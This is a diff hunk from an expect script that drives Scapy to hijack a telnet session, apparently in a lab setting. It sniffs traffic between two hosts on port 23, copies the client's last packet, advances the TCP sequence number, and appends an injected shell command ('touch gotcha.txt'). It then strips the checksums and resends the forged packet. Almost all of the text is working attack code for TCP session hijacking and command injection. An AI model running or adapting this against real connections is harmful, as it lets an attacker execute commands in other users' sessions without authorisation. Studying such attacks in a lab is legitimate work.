@@ -59,31 +59,20 @@ expect ">>> ";
 # Q: why ? 
 
 send "cap = sniff(filter=\"tcp and dst host 20.20.20.55 and src host 20.20.20.89 and dst port 23\", count=100, iface=\"eth2\", timeout=20) \r" 
-
 # We need to retrieve the last packet sent by the client,
-# and make sure it is an empty one
-
-
 send "am=len(cap)-1\r"
-
 # am is the index of the last packet received
-
-# send "syn=cap\[0\].copy()\r"
-# send "synack=cap\[1\].copy()\r"
-# send "ack=cap\[2\].copy()\r"
 
 send "data=cap\[am\].copy() \r"
 # how many bytes did the client sent in its last packet?
 send "text=len(data\[Raw\].load)\r"
 # increase the seq number accordingly
 send "data\[TCP\].seq=data\[TCP\].seq+text\r"
-
 send "command=\"touch gotcha.txt\\n\"\r"
 send "data=data / Raw(load=command) \r"
 send "del data\[TCP\].chksum \r"
 send "del data\[IP\].chksum \r"
 send "del data\[IP\].len \r"
-
 send "sendp(data, iface=\"eth2\") \r"
 
 
